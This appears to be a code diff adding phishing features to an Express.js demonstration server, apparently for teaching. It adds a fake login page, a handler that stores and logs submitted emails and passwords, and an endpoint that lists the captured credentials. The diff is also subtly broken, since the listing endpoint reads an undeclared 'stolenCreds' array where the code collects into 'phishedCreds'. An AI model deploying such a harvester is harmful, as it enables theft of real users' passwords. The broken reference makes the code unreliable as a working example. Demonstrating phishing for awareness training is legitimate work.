@@ -12,6 +12,7 @@ let users = {};
 let clicks = 0;
 let lastDeletedAccount = null;
 let lastHeaderLog = null; // store only the last log
+let phishedCreds = [];
 
 // Helper: generate random ID
 function genId() {
@@ -220,6 +221,45 @@ app.get("/logHeaders", (req, res) => {
   console.log("📋 Headers from client:", req.headers);
   lastHeaderLog = req.headers; // overwrite with last request only
   res.send("Headers logged. <a href='/'>See Home</a>");
+});
+
+// Fake phishing page
+app.get("/phish", (req, res) => {
+  res.send(`
+    <html>
+    <head><title>🔒 Fake Login</title></head>
+    <body style="font-family: Arial; background:#f9f9f9; text-align:center; padding:50px;">
+      <h1>Login Required</h1>
+      <form method="POST" action="/steal" style="display:inline-block; text-align:left; background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1);">
+        <label>Email:</label><br>
+        <input type="text" name="email" /><br><br>
+        <label>Password:</label><br>
+        <input type="password" name="password" /><br><br>
+        <button type="submit">Login</button>
+      </form>
+    </body>
+    </html>
+  `);
+});
+
+// Collect phished credentials
+app.post("/steal", (req, res) => {
+  const { email, password } = req.body;
+  phishedCreds.push({ email, password, time: new Date().toISOString() });
+  console.log("⚠️ Phished credentials:", email, password);
+  res.send(
+    "❌ Invalid login. Meanwhile, attacker stole your credentials. <a href='/'>Home</a>"
+  );
+});
+
+// Admin endpoint to view stolen creds
+app.get("/stolen", (req, res) => {
+  const list = stolenCreds
+    .map((c) => `<li>${c.email} / ${c.password} (${c.time})</li>`)
+    .join("");
+  res.send(
+    `<h1>Stolen Credentials</h1><ul>${list || "<li>None yet</li>"}</ul>`
+  );
 });
 
 // Start server
